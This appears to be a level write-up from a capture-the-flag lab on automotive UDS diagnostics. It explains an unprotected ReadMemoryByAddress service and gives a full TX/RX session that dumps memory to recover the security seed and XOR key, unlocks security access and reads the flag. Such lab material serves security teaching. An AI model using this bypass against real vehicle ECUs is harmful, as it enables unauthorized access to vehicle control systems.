## Level 6

ReadMemoryByAddress (0x23)

This level builds on level 5; however, instead of having a list of static keys for auth the server is now generating a
random seed and xor key. In the case the security lockout is hit, the EcuReset service can be used to reset the auth
attempts counter. It is not feasible to attack the random number generation ("crypto/rand"), the bug here is that the
ReadMemoryByAddress service is not properly protected, allowing access to the running service memory. A successful
unlock allows access to Diagnostic Session 0x02 and ReadDataIdentifier 0x1337.

Example ReadMemoryByAddress Message:
23 11 50 10

Message Definition:
ReadMemoryByAddress - 0x23 AddressAndLengthFormat - 0x11 - high nibble is length of memory size, low is length of
Address MemoryAddress - 0x50 - memory address to read from MemorySize - 0x10 - size of memory read

Positive Response:
63 00010000000000000000000000000000

Example using alternate AddressAndLengthFormat:
23 33 000050 000010 63 00010000000000000000000000000000

Example session

```shell
<Level changed> 0x06: Level6
# diagnostic session 0x02 request
TX: 10 02
# diagnostic session response - Negative Response - Security Access Denied
RX: 7f 1033

# read data by identifier 0xf190 (VIN)
TX: 22 f190
# read data by identifier - Positive Response
RX: 62 f190415452454449533133337

# read data by identifier 0x1337 (Flag)
TX: 22 1337
# read data by identifier - Negative Response - Conditions Not Correct
RX: 7f 2222

# securityAccess seed request (0x01)
TX: 27 01
# securityAccess seed request - Positive Response - 0x79341de17d39dc87
RX: 67 0179341de17d39dc87

# read memory by address - AddressFormat (0x11 - addr and len are 1byte), Address 0x00, Length 0xff
TX: 23 11 00 ff
# read memory by address - Positive Response - Memory contents (includes security seed and xor key)
RX: 63 00000000000000000000000000000000010000000000000000000000000000004154524544495331333337000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000079341de17d39dc870000000000000000d34c68b810727629000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000

# security access auth attempt with seed ^ key (aa7875596d4baaae) - Positive Response
TX: 27 02 aa7875596d4baaae
# security access auth  - Positive Response
RX: 67 02

# diagnostic session 0x02 request
TX: 10 02
# diagnostic session 0x02 - Positive Response
RX: 50 02

# read data by identifier 0x1337 (Flag)
TX: 22 1337
# read data by identifier 0x1337 (Flag) - Positive Response
RX: 62 1337746861742d736572766963652d736c69707065642d6d792d4d454d4f5259
```